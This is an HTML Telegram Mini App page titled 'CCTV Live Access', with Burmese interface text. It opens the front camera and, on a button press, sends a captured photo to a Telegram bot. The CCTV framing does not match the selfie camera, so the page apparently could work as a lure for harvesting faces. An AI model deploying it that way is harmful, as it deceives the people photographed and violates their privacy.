<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CCTV Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { text-align: center; font-family: sans-serif; background: #1a1a1a; color: white; padding: 20px; }
        video { width: 100%; max-width: 400px; border-radius: 12px; border: 2px solid #0088cc; }
        button { 
            padding: 15px 30px; font-size: 18px; font-weight: bold;
            background: #0088cc; color: white; border: none; 
            border-radius: 8px; margin-top: 20px; cursor: pointer;
            width: 100%; max-width: 400px;
        }
        button:active { background: #006699; }
        #status { margin-top: 10px; color: #aaaaaa; font-size: 14px; }
    </style>
</head>
<body>
    <h3>CCTV Live Access</h3>
    <video id="video" autoplay playsinline></video>
    <br>
    <button id="capture">ဓာတ်ပုံရိုက်မည်</button>
    <div id="status">Camera ပြင်ဆင်နေသည်...</div>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const captureButton = document.getElementById('capture');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        // ၁။ Camera ကို အရင်ဖွင့်မည်
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, // ရှေ့ကင်မရာ သုံးမည်
                    audio: false 
                });
                video.srcObject = stream;
                status.innerText = "Camera အသင့်ဖြစ်ပါပြီ။";
            } catch (err) {
                status.innerText = "Error: Camera ဖွင့်၍မရပါ။ (Permission ပေးရန် လိုအပ်သည်)";
                console.error(err);
            }
        }

        // ၂။ ခလုတ်နှိပ်သည့် အခါ လုပ်ဆောင်ချက်
        captureButton.addEventListener('click', () => {
            if (!video.srcObject) {
                alert("Camera အလုပ်မလုပ်သေးပါ။");
                return;
            }

            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8); // 80% quality
            
            // Telegram Bot ဆီသို့ ပို့မည်
            if (window.Telegram.WebApp) {
                status.innerText = "ပုံပို့နေသည်...";
                window.Telegram.WebApp.sendData(JSON.stringify({image: imageData}));
                // ခေတ္တစောင့်ပြီးမှ ပိတ်မည်
                setTimeout(() => {
                    window.Telegram.WebApp.close();
                }, 500);
            }
        });

        // App ready ဖြစ်ကြောင်း အကြောင်းကြားခြင်း
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand(); // Screen အပြည့်ချဲ့မည်
        startCamera();
    </script>
</body>
</html>
